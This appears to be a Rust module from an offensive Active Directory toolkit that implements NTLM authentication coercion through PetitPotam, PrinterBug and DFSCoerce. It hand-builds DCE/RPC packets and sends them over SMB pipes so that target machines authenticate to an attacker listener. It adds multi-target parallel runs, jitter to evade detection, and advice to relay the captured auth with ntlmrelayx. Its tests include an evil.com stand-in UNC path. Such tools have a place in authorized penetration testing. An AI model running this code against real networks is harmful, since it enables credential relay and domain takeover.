//! Authentication Coercion — Trigger NTLM authentication from a target
//! machine to an attacker-controlled listener using various RPC methods.
//!
//! Supported coercion techniques:
//! - PetitPotam (MS-EFSR: EfsRpcOpenFileRaw)
//! - PrinterBug / SpoolSample (MS-RPRN: RpcRemoteFindFirstPrinterChangeNotification)
//! - DFSCoerce (MS-DFSNM: NetrDfsRemoveStdRoot / NetrDfsAddStdRoot)

use crate::runner::HuntConfig;
use colored::Colorize;
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::smb::SmbSession;
use serde::{Deserialize, Serialize};
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════
// Named pipe / RPC constants
// ═══════════════════════════════════════════════════════════

/// MS-EFSR (Encrypting File System Remote) pipe — PetitPotam
const PIPE_EFSR: &str = "lsarpc";
const PIPE_EFSR_ALT: &str = "efsrpc";

/// MS-RPRN (Print System Remote) pipe — PrinterBug
const PIPE_SPOOLSS: &str = "spoolss";

/// MS-DFSNM (DFS Namespace Management) pipe — DFSCoerce
const PIPE_NETDFS: &str = "netdfs";

/// EFSR RPC interface UUID
const EFSR_UUID: &str = "c681d488-d850-11d0-8c52-00c04fd90f7e";
/// RPRN RPC interface UUID
const RPRN_UUID: &str = "12345678-1234-abcd-ef00-0123456789ab";
/// DFSNM RPC interface UUID
const DFSNM_UUID: &str = "4fc742e0-4a10-11cf-8273-00aa004ae673";

// ═══════════════════════════════════════════════════════════
// Configuration
// ═══════════════════════════════════════════════════════════

/// Coercion method to use
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum CoerceMethod {
    /// EfsRpcOpenFileRaw (MS-EFSR) — PetitPotam
    PetitPotam,
    /// RpcRemoteFindFirstPrinterChangeNotification (MS-RPRN) — PrinterBug
    PrinterBug,
    /// NetrDfsRemoveStdRoot (MS-DFSNM) — DFSCoerce
    DfsCoerce,
}

impl std::fmt::Display for CoerceMethod {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::PetitPotam => write!(f, "PetitPotam (MS-EFSR)"),
            Self::PrinterBug => write!(f, "PrinterBug (MS-RPRN)"),
            Self::DfsCoerce => write!(f, "DFSCoerce (MS-DFSNM)"),
        }
    }
}

#[derive(Debug, Clone)]
pub struct CoerceConfig {
    /// Target machine to coerce authentication from
    pub target: String,
    /// Listener host (attacker machine receiving the NTLM auth)
    pub listener: String,
    /// Listener port (typically 445 for SMB relay or 80 for HTTP)
    pub listener_port: u16,
    /// Specific methods to try (empty = try all)
    pub methods: Vec<CoerceMethod>,
    /// UNC path format for the listener
    pub listener_path: Option<String>,
}

impl Default for CoerceConfig {
    fn default() -> Self {
        Self {
            target: String::new(),
            listener: String::new(),
            listener_port: 445,
            methods: vec![
                CoerceMethod::PetitPotam,
                CoerceMethod::PrinterBug,
                CoerceMethod::DfsCoerce,
            ],
            listener_path: None,
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Result
// ═══════════════════════════════════════════════════════════

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CoerceResult {
    pub target: String,
    pub listener: String,
    pub methods_attempted: usize,
    pub successful_coercions: Vec<CoercionAttempt>,
    pub failed_coercions: Vec<CoercionAttempt>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CoercionAttempt {
    pub method: String,
    pub pipe: String,
    pub success: bool,
    pub error: Option<String>,
}

// ═══════════════════════════════════════════════════════════
// DCE/RPC PDU Construction
// ═══════════════════════════════════════════════════════════

/// Build a minimal DCE/RPC Bind request for an interface UUID
fn build_rpc_bind(interface_uuid: &str, version_major: u16) -> Vec<u8> {
    let uuid_bytes = parse_uuid_to_ndr(interface_uuid);

    // RPC header: version 5.0, packet type bind(11), flags first+last
    let mut pdu = vec![5, 0, 11, 0x03];
    // NDR representation
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);

    let frag_len_offset = pdu.len();
    pdu.extend_from_slice(&[0x00, 0x00]); // frag_length (fill later)
    pdu.extend_from_slice(&[0x00, 0x00]); // auth_length
    pdu.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // call_id

    // Max xmit/recv frag
    pdu.extend_from_slice(&4280u16.to_le_bytes());
    pdu.extend_from_slice(&4280u16.to_le_bytes());
    pdu.extend_from_slice(&0u32.to_le_bytes()); // assoc_group

    // Context list
    pdu.push(1); // num contexts
    pdu.extend_from_slice(&[0x00, 0x00, 0x00]); // padding

    // Context item
    pdu.extend_from_slice(&0u16.to_le_bytes()); // context_id
    pdu.push(1); // num_transfer_syntaxes
    pdu.push(0); // padding

    // Abstract syntax (interface UUID + version)
    pdu.extend_from_slice(&uuid_bytes);
    pdu.extend_from_slice(&version_major.to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes()); // minor version

    // Transfer syntax (NDR)
    let ndr_uuid = parse_uuid_to_ndr("8a885d04-1ceb-11c9-9fe8-08002b104860");
    pdu.extend_from_slice(&ndr_uuid);
    pdu.extend_from_slice(&2u16.to_le_bytes()); // version major
    pdu.extend_from_slice(&0u16.to_le_bytes()); // version minor

    // Fill in fragment length
    let frag_len = pdu.len() as u16;
    pdu[frag_len_offset..frag_len_offset + 2].copy_from_slice(&frag_len.to_le_bytes());

    pdu
}

/// Build DCE/RPC Request PDU for EfsRpcOpenFileRaw (opnum 0)
fn build_efsr_request(listener_path: &str) -> Vec<u8> {
    let path_utf16: Vec<u8> = listener_path
        .encode_utf16()
        .chain(std::iter::once(0u16))
        .flat_map(|c| c.to_le_bytes())
        .collect();

    let path_len = (listener_path.len() + 1) as u32;
    let mut stub = Vec::new();
    // FileName (pointer + conformant string)
    stub.extend_from_slice(&0x00020000u32.to_le_bytes()); // referent ID
    stub.extend_from_slice(&path_len.to_le_bytes()); // max count
    stub.extend_from_slice(&0u32.to_le_bytes()); // offset
    stub.extend_from_slice(&path_len.to_le_bytes()); // actual count
    stub.extend_from_slice(&path_utf16);
    // Pad to 4-byte boundary
    while !stub.len().is_multiple_of(4) {
        stub.push(0);
    }
    stub.extend_from_slice(&0u32.to_le_bytes()); // Flags = 0

    build_rpc_request(0, &stub)
}

/// Build DCE/RPC Request PDU for RpcRemoteFindFirstPrinterChangeNotification (opnum 69)
fn build_rprn_request(listener_path: &str) -> Vec<u8> {
    let server_utf16: Vec<u8> = listener_path
        .encode_utf16()
        .chain(std::iter::once(0u16))
        .flat_map(|c| c.to_le_bytes())
        .collect();

    let server_len = (listener_path.len() + 1) as u32;
    let mut stub = Vec::new();
    stub.extend_from_slice(&0x00020000u32.to_le_bytes()); // referent ID
    stub.extend_from_slice(&server_len.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&server_len.to_le_bytes());
    stub.extend_from_slice(&server_utf16);
    while !stub.len().is_multiple_of(4) {
        stub.push(0);
    }

    build_rpc_request(69, &stub)
}

/// Build DCE/RPC Request PDU for NetrDfsRemoveStdRoot (opnum 13)
fn build_dfsnm_request(listener_path: &str) -> Vec<u8> {
    let server_utf16: Vec<u8> = listener_path
        .encode_utf16()
        .chain(std::iter::once(0u16))
        .flat_map(|c| c.to_le_bytes())
        .collect();

    let server_len = (listener_path.len() + 1) as u32;
    let mut stub = Vec::new();
    // ServerName
    stub.extend_from_slice(&server_len.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&server_len.to_le_bytes());
    stub.extend_from_slice(&server_utf16);
    while !stub.len().is_multiple_of(4) {
        stub.push(0);
    }
    // RootShare
    let root = "test\0"
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect::<Vec<u8>>();
    let root_len = 5u32;
    stub.extend_from_slice(&root_len.to_le_bytes());
    stub.extend_from_slice(&0u32.to_le_bytes());
    stub.extend_from_slice(&root_len.to_le_bytes());
    stub.extend_from_slice(&root);
    while !stub.len().is_multiple_of(4) {
        stub.push(0);
    }
    stub.extend_from_slice(&0u32.to_le_bytes()); // ApiFlags

    build_rpc_request(13, &stub)
}

/// Build a generic DCE/RPC Request PDU wrapper
fn build_rpc_request(opnum: u16, stub_data: &[u8]) -> Vec<u8> {
    // RPC version 5.0, packet type Request(0), flags first+last
    let mut pdu = vec![5, 0, 0, 0x03];
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // NDR

    let frag_len = (24 + stub_data.len()) as u16;
    pdu.extend_from_slice(&frag_len.to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes()); // auth_length
    pdu.extend_from_slice(&1u32.to_le_bytes()); // call_id

    pdu.extend_from_slice(&(stub_data.len() as u32).to_le_bytes()); // alloc_hint
    pdu.extend_from_slice(&0u16.to_le_bytes()); // context_id
    pdu.extend_from_slice(&opnum.to_le_bytes()); // opnum
    pdu.extend_from_slice(stub_data);

    pdu
}

/// Parse a UUID string into NDR wire format (mixed-endian)
fn parse_uuid_to_ndr(uuid_str: &str) -> Vec<u8> {
    let hex: String = uuid_str.replace('-', "");
    let bytes = hex::decode(&hex).unwrap_or_else(|_| vec![0u8; 16]);

    let mut ndr = Vec::with_capacity(16);
    // First 3 groups: little-endian
    ndr.extend_from_slice(&[bytes[3], bytes[2], bytes[1], bytes[0]]); // time_low
    ndr.extend_from_slice(&[bytes[5], bytes[4]]); // time_mid
    ndr.extend_from_slice(&[bytes[7], bytes[6]]); // time_hi
    // Last 2 groups: big-endian
    ndr.extend_from_slice(&bytes[8..16]);

    ndr
}

// ═══════════════════════════════════════════════════════════
// Coercion Execution
// ═══════════════════════════════════════════════════════════

async fn try_coerce(
    smb: &SmbSession,
    method: CoerceMethod,
    listener_path: &str,
) -> CoercionAttempt {
    #[allow(clippy::type_complexity)]
    let (pipe, uuid, version, request_builder): (&str, &str, u16, fn(&str) -> Vec<u8>) =
        match method {
            CoerceMethod::PetitPotam => (PIPE_EFSR, EFSR_UUID, 1, build_efsr_request),
            CoerceMethod::PrinterBug => (PIPE_SPOOLSS, RPRN_UUID, 1, build_rprn_request),
            CoerceMethod::DfsCoerce => (PIPE_NETDFS, DFSNM_UUID, 3, build_dfsnm_request),
        };

    info!("  {} Trying {} via \\\\pipe\\{}", "→".cyan(), method, pipe);

    // Step 1: RPC Bind
    let bind_pdu = build_rpc_bind(uuid, version);
    let bind_response = match smb.pipe_transact(pipe, &bind_pdu).await {
        Ok(r) => r,
        Err(e) => {
            // PetitPotam fallback: try efsrpc pipe
            if method == CoerceMethod::PetitPotam {
                debug!("  Trying fallback pipe: {}", PIPE_EFSR_ALT);
                match smb.pipe_transact(PIPE_EFSR_ALT, &bind_pdu).await {
                    Ok(r) => r,
                    Err(e2) => {
                        return CoercionAttempt {
                            method: method.to_string(),
                            pipe: pipe.to_string(),
                            success: false,
                            error: Some(format!("Bind failed (both pipes): {e2}")),
                        };
                    }
                }
            } else {
                return CoercionAttempt {
                    method: method.to_string(),
                    pipe: pipe.to_string(),
                    success: false,
                    error: Some(format!("Bind failed: {e}")),
                };
            }
        }
    };

    // Check bind response (byte 2 should be 12 = bind_ack)
    if bind_response.len() < 4 || bind_response[2] != 12 {
        return CoercionAttempt {
            method: method.to_string(),
            pipe: pipe.to_string(),
            success: false,
            error: Some("RPC bind rejected".to_string()),
        };
    }

    // Step 2: Send the coercion request
    let request_pdu = request_builder(listener_path);
    match smb.pipe_transact(pipe, &request_pdu).await {
        Ok(response) => {
            // Any response (even an error) often means coercion was triggered
            // The target attempts to connect back
            // ── continuing from: match smb.pipe_transact(pipe, &request_pdu).await { Ok(response) => {
            // Check RPC response status
            // Response type 2 = Response PDU; last 4 bytes = return value
            let rpc_status = if response.len() >= 28 {
                let status_offset = response.len() - 4;
                u32::from_le_bytes([
                    response[status_offset],
                    response[status_offset + 1],
                    response[status_offset + 2],
                    response[status_offset + 3],
                ])
            } else {
                0xFFFFFFFF
            };

            // For coercion, even "access denied" (0x00000005) or
            // "bad network path" (0x00000035) means the target tried
            // to reach our listener — coercion succeeded.
            let coercion_triggered = matches!(
                rpc_status,
                0x00000000  // SUCCESS
                | 0x00000005  // ERROR_ACCESS_DENIED
                | 0x00000035  // ERROR_BAD_NETPATH
                | 0x0000003A  // ERROR_BAD_NET_NAME
                | 0x00000033  // ERROR_REM_NOT_LIST
                | 0x00000040  // ERROR_NETNAME_DELETED
                | 0x0000006D  // ERROR_BAD_DEV_TYPE
                | 0x00000057 // ERROR_INVALID_PARAMETER
            );

            if coercion_triggered {
                info!(
                    "  {} {} — coercion triggered! (status: 0x{:08X})",
                    "✓".green().bold(),
                    method.to_string().green(),
                    rpc_status
                );
            } else {
                debug!(
                    "  {} {} — unexpected status: 0x{:08X}",
                    "?".yellow(),
                    method,
                    rpc_status
                );
            }

            CoercionAttempt {
                method: method.to_string(),
                pipe: pipe.to_string(),
                success: coercion_triggered,
                error: if coercion_triggered {
                    None
                } else {
                    Some(format!("Unexpected RPC status: 0x{:08X}", rpc_status))
                },
            }
        }
        Err(e) => {
            // Some coercion methods trigger auth BEFORE the RPC completes,
            // so a broken pipe / timeout can still mean success
            let err_str = e.to_string();
            let likely_triggered = err_str.contains("pipe")
                || err_str.contains("reset")
                || err_str.contains("broken")
                || err_str.contains("timeout");

            if likely_triggered {
                info!(
                    "  {} {} — pipe broken (coercion likely triggered)",
                    "~".yellow(),
                    method
                );
                CoercionAttempt {
                    method: method.to_string(),
                    pipe: pipe.to_string(),
                    success: true,
                    error: Some(format!("Pipe error (likely success): {err_str}")),
                }
            } else {
                warn!("  {} {} — request failed: {}", "✗".red(), method, err_str);
                CoercionAttempt {
                    method: method.to_string(),
                    pipe: pipe.to_string(),
                    success: false,
                    error: Some(err_str),
                }
            }
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Pipe Availability Check
// ═══════════════════════════════════════════════════════════

/// Check which coercion-relevant named pipes are accessible on the target
async fn check_pipe_availability(smb: &SmbSession) -> Vec<(CoerceMethod, bool)> {
    let pipes_to_check = [
        (CoerceMethod::PetitPotam, vec![PIPE_EFSR, PIPE_EFSR_ALT]),
        (CoerceMethod::PrinterBug, vec![PIPE_SPOOLSS]),
        (CoerceMethod::DfsCoerce, vec![PIPE_NETDFS]),
    ];

    let mut results = Vec::new();

    for (method, pipe_names) in &pipes_to_check {
        let mut accessible = false;
        for pipe_name in pipe_names {
            // Try to open the pipe with a minimal read
            match smb.pipe_transact(pipe_name, &[]).await {
                Ok(_) => {
                    accessible = true;
                    break;
                }
                Err(e) => {
                    let err_str = e.to_string();
                    // "STATUS_PIPE_NOT_AVAILABLE" means pipe exists but rejected empty data
                    // which still means the service is running
                    if err_str.contains("PIPE") || err_str.contains("INVALID") {
                        accessible = true;
                        break;
                    }
                }
            }
        }
        debug!(
            "Pipe check: {} — {}",
            method,
            if accessible { "available" } else { "not found" }
        );
        results.push((*method, accessible));
    }

    results
}

// ═══════════════════════════════════════════════════════════
// Listener Path Builder
// ═══════════════════════════════════════════════════════════

/// Build the UNC path that the target will be coerced into connecting to
fn build_listener_path(listener: &str, custom_path: Option<&str>) -> String {
    if let Some(path) = custom_path {
        return path.to_string();
    }
    // Standard UNC path: \\attacker\share\file.txt
    format!("\\\\{}\\overthrone\\coerce.txt", listener)
}

/// Build WebDAV-style path for HTTP-based capture
#[allow(dead_code)] // WebDAV path builder kept for future HTTP relay support
fn build_webdav_listener_path(listener: &str, port: u16) -> String {
    if port == 80 {
        format!("\\\\{}@80\\webdav\\coerce.txt", listener)
    } else {
        format!("\\\\{}@{}\\webdav\\coerce.txt", listener, port)
    }
}

// ═══════════════════════════════════════════════════════════
// Scan Mode — Check which methods work WITHOUT triggering
// ═══════════════════════════════════════════════════════════

/// Scan a target to determine which coercion methods are likely available
/// (checks pipe accessibility without sending actual coercion requests)
pub async fn scan(config: &HuntConfig, target: &str) -> Result<Vec<(CoerceMethod, bool)>> {
    info!("Coerce scan: checking pipe availability on {}", target);

    let smb = SmbSession::connect(target, &config.domain, &config.username, &config.secret).await?;

    let results = check_pipe_availability(&smb).await;

    for (method, available) in &results {
        let icon = if *available {
            "✓".green()
        } else {
            "✗".red()
        };
        info!(
            "  {} {} — pipe {}",
            icon,
            method,
            if *available {
                "accessible"
            } else {
                "not found"
            }
        );
    }

    Ok(results)
}

// ═══════════════════════════════════════════════════════════
// Multi-Target Coercion
// ═══════════════════════════════════════════════════════════

/// Attempt coercion against multiple targets in parallel
pub async fn coerce_multiple(
    config: &HuntConfig,
    targets: &[String],
    listener: &str,
    methods: &[CoerceMethod],
    concurrency: usize,
) -> Vec<(String, CoerceResult)> {
    use std::sync::Arc;
    use tokio::sync::Semaphore;

    let sem = Arc::new(Semaphore::new(concurrency));
    let mut handles = Vec::new();

    for target in targets {
        let target = target.clone();
        let config = config.clone();
        let listener = listener.to_string();
        let methods = methods.to_vec();
        let sem = Arc::clone(&sem);

        handles.push(tokio::spawn(async move {
            let _permit = sem.acquire().await.unwrap();
            let cc = CoerceConfig {
                target: target.clone(),
                listener: listener.clone(),
                listener_port: 445,
                methods,
                listener_path: None,
            };
            let result = run(&config, &cc).await.unwrap_or_else(|e| CoerceResult {
                target: target.clone(),
                listener: listener.clone(),
                methods_attempted: 0,
                successful_coercions: Vec::new(),
                failed_coercions: vec![CoercionAttempt {
                    method: "connect".to_string(),
                    pipe: String::new(),
                    success: false,
                    error: Some(e.to_string()),
                }],
            });
            (target, result)
        }));
    }

    let mut results = Vec::new();
    for handle in handles {
        if let Ok(r) = handle.await {
            results.push(r);
        }
    }
    results
}

// ═══════════════════════════════════════════════════════════
// Public Runner
// ═══════════════════════════════════════════════════════════

pub async fn run(config: &HuntConfig, cc: &CoerceConfig) -> Result<CoerceResult> {
    info!("{}", "═══ AUTHENTICATION COERCION ═══".bold().red());

    if cc.target.is_empty() || cc.listener.is_empty() {
        return Err(OverthroneError::custom(
            "Coercion requires --target and --listener",
        ));
    }

    info!("  Target:   {}", cc.target.bold());
    info!(
        "  Listener: {} (port {})",
        cc.listener.cyan(),
        cc.listener_port
    );

    // Step 1: Establish SMB session to target
    let smb = SmbSession::connect(&cc.target, &config.domain, &config.username, &config.secret)
        .await
        .map_err(|e| {
            OverthroneError::Smb(format!("Cannot connect to target '{}': {e}", cc.target))
        })?;

    info!("  {} SMB session established", "✓".green());

    // Step 2: Build listener path
    let listener_path = build_listener_path(&cc.listener, cc.listener_path.as_deref());
    info!("  Listener UNC: {}", listener_path.yellow());

    // Step 3: Determine which methods to try
    let methods = if cc.methods.is_empty() {
        vec![
            CoerceMethod::PetitPotam,
            CoerceMethod::PrinterBug,
            CoerceMethod::DfsCoerce,
        ]
    } else {
        cc.methods.clone()
    };

    // Step 4: Try each coercion method
    let mut successful = Vec::new();
    let mut failed = Vec::new();

    for method in &methods {
        let attempt = try_coerce(&smb, *method, &listener_path).await;

        if attempt.success {
            successful.push(attempt);
            // Often one successful coercion is enough — the auth is in-flight
            info!(
                "  {} Coercion successful! Check your listener at {}",
                "★".green().bold(),
                cc.listener.bold().cyan()
            );
        } else {
            failed.push(attempt);
        }

        // Brief delay between methods to avoid detection
        config.apply_jitter().await;
    }

    // Summary
    if successful.is_empty() {
        warn!(
            "  {} No coercion methods succeeded against {}",
            "✗".red(),
            cc.target
        );
        info!("  Possible reasons:");
        info!("    • Target is patched against known coercion methods");
        info!("    • Required services (Spooler, EFSR, DFS) are disabled");
        info!("    • Network filtering blocks SMB/RPC traffic");
        info!("    • Insufficient privileges on the target");
    } else {
        info!(
            "\n  {} {}/{} coercion methods succeeded",
            "→".cyan(),
            successful.len().to_string().green().bold(),
            methods.len()
        );
        info!(
            "  {} Capture NTLM auth with: ntlmrelayx / responder / overthrone-reaper",
            "→".cyan()
        );
    }

    Ok(CoerceResult {
        target: cc.target.clone(),
        listener: cc.listener.clone(),
        methods_attempted: methods.len(),
        successful_coercions: successful,
        failed_coercions: failed,
    })
}

// ═══════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_uuid_parse_ndr() {
        let uuid = "c681d488-d850-11d0-8c52-00c04fd90f7e";
        let ndr = parse_uuid_to_ndr(uuid);
        assert_eq!(ndr.len(), 16);
        // First 4 bytes should be little-endian of 0xc681d488
        assert_eq!(ndr[0], 0x88);
        assert_eq!(ndr[1], 0xd4);
        assert_eq!(ndr[2], 0x81);
        assert_eq!(ndr[3], 0xc6);
    }

    #[test]
    fn test_listener_path_default() {
        let path = build_listener_path("10.0.0.50", None);
        assert_eq!(path, "\\\\10.0.0.50\\overthrone\\coerce.txt");
    }

    #[test]
    fn test_listener_path_custom() {
        let custom = "\\\\evil.com\\share\\pwn.txt";
        let path = build_listener_path("10.0.0.50", Some(custom));
        assert_eq!(path, custom);
    }

    #[test]
    fn test_webdav_path() {
        let path = build_webdav_listener_path("10.0.0.50", 80);
        assert_eq!(path, "\\\\10.0.0.50@80\\webdav\\coerce.txt");

        let path = build_webdav_listener_path("10.0.0.50", 8080);
        assert_eq!(path, "\\\\10.0.0.50@8080\\webdav\\coerce.txt");
    }

    #[test]
    fn test_rpc_bind_construction() {
        let bind = build_rpc_bind(EFSR_UUID, 1);
        assert!(bind.len() > 20);
        assert_eq!(bind[0], 5); // RPC version major
        assert_eq!(bind[2], 11); // Bind packet type
    }

    #[test]
    fn test_rpc_request_construction() {
        let req = build_rpc_request(0, &[0x41, 0x42, 0x43, 0x44]);
        assert!(req.len() >= 28);
        assert_eq!(req[0], 5); // RPC version major
        assert_eq!(req[2], 0); // Request packet type
        // Opnum at offset 22-23
        assert_eq!(req[22], 0);
        assert_eq!(req[23], 0);
    }

    #[test]
    fn test_coerce_method_display() {
        assert_eq!(CoerceMethod::PetitPotam.to_string(), "PetitPotam (MS-EFSR)");
        assert_eq!(CoerceMethod::PrinterBug.to_string(), "PrinterBug (MS-RPRN)");
        assert_eq!(CoerceMethod::DfsCoerce.to_string(), "DFSCoerce (MS-DFSNM)");
    }
}
